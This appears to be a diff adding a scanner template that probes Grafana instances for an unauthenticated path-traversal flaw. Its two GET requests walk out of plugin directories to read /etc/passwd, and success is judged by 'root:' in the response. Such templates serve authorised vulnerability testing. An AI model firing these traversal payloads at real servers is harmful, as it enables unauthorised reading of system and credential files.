@@ -1,0 +1,51 @@
+id: grafana-unauth-lfi
+donce: true
+info:
+  name: Grafana Unauth LFI
+  risk: High
+
+params:
+  - root: "{{.BaseURL}}"
+
+replicate:
+  ports: '3000'
+
+variables:
+  - endpoint: |
+      /
+      /grafana/
+      /debug/grafana/
+      /-/grafana/
+      /gitlab/-/grafana/
+      /-/debug/grafana/
+  - plugin: |
+      grafana-clock-panel
+    # mysql
+    # graph
+    # influxdb
+    # prometheus
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.endpoint}}public/plugins/grafana-clock-panel/../../../../../../etc/passwd
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+      - Content-Type: application/json
+      - Referer: "{{.BaseURL}}/login"
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("body", "root:") && StringSearch("body", 'bin/bash')
+
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.endpoint}}public/plugins/{{.plugin}}/../|..%2f../|..%2f../|..%2f../|..%2f../|..%2f../|..%2f/etc/passwd
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+      - Content-Type: application/json
+      - Referer: "{{.BaseURL}}/login"
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("body", "root:") && StringSearch("body", 'bin/bash')
